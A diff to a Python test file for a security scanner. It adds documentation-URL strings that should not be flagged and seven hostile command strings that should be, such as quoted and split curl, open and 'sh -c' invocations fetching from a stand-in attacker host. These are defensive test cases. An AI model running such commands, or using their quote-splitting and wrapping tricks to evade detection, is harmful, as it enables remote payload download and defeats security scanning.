@@ -1087,6 +1087,8 @@ def test_scan_stream_detects_base64_encoded_execution_text(encoded: str, pattern
         "See https://docs.example.invalid/reference/requests.get(url) for details",
         "Author's docs: https://example.invalid/a'b/os.system(cmd)",
         "metadata = 'https://docs.example.invalid/requests.get(url)?a=1&b=2;c=3'",
+        "description='docs'; metadata='https://docs.example.invalid/reference/requests.get(url)'",
+        "metadata={'url':'https://docs.example.invalid/reference/requests.get(url)','offset':-1}",
         pytest.param(
             ("A" * 4096)
             + "https://docs.example.invalid/reference/requests.get(url)"
@@ -1301,6 +1303,13 @@ def test_scan_stream_encoded_decoded_byte_budgets_fail_closed(encoding: str) -> 
         'Use documentation example metadata; c""url https://attacker.example/payload',
         "Use documentation example metadata <(git clone https://attacker.example/payload )",
         'f"{client:https://attacker.example/payload}"',
+        "'/usr/bin/curl' 'https://attacker.example/payload'",
+        "'/usr/bin/open' 'https://attacker.example/payload'",
+        "OPEN_MODE='safe' '/usr/bin/open' 'https://attacker.example/payload'",
+        "metadata='docs'; '/usr/bin/cu''rl' 'https://attacker.example/payload'",
+        "'env' '/usr/bin/curl' 'https://attacker.example/payload'",
+        "'sh' '-c' '/usr/bin/curl https://attacker.example/payload'",
+        "'/usr/bin/cu'\\\n'rl' 'https://attacker.example/payload'",
     ],
     ids=[
         "alias",
@@ -1328,6 +1337,13 @@ def test_scan_stream_encoded_decoded_byte_budgets_fail_closed(encoding: str) -> 
         "quote-joined-shell-command",
         "process-substitution",
         "f-string-format-dispatch",
+        "adjacent-curl-argv",
+        "adjacent-open-argv",
+        "assignment-adjacent-open-argv",
+        "assignment-split-adjacent-curl-argv",
+        "adjacent-env-curl-argv",
+        "adjacent-sh-c-argv",
+        "line-continued-adjacent-curl-argv",
     ],
 )
 def test_scan_stream_keeps_executable_pickle_urls_actionable(loader: str, protocol: int) -> None:
